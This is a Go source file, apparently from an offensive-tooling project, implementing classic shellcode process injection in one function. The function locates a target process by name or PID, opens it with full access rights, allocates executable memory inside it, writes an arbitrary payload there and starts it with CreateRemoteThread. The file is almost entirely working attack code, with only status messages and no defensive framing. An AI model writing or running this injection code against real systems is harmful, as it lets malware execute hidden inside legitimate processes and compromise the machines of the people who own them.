package main

import "os"
import "fmt"
import "unsafe"


func CreateRemoteThread_Injection(process_name string, pid int, payload []byte){
   // Get PID
   if ((process_name == "") && (pid == 0)){
      fmt.Println("[-] Process name or PID is necessary. ");
      os.Exit(-1);
   }
   var pid_uintptr uintptr;
   if (process_name != "") {
      fmt.Println("[+] Process name: \t\t", process_name);   
      var proc_handles_slice []uintptr = GetProcessByName(process_name);
      if (len(proc_handles_slice) < 1){
         fmt.Println("[-] No PID returned for process name:", process_name, "\n[-] Try adding \".exe\" at the end of the process name.");
         os.Exit(-1);
      } else {
         var first_proc = proc_handles_slice[0];
         pid_uintptr = GetProcessId(first_proc);   
      }
   } else{
         pid_uintptr = uintptr(pid)
   }
   fmt.Println("[+] Process PID: \t\t", pid_uintptr);

   // OpenProcess
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid_uintptr);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, 0x1000, 0x3000, 0x40);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);


   // CreateRemoteThread
   res = CreateRemoteThread(proc_handle, 0, 0, assigned_address, 0, 0, 0);
   if (res == 0){
      fmt.Println("[-] CreateRemoteThread API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Created thread id: \t\t", res);
   
   // CloseHandle
   CloseHandle(proc_handle);
}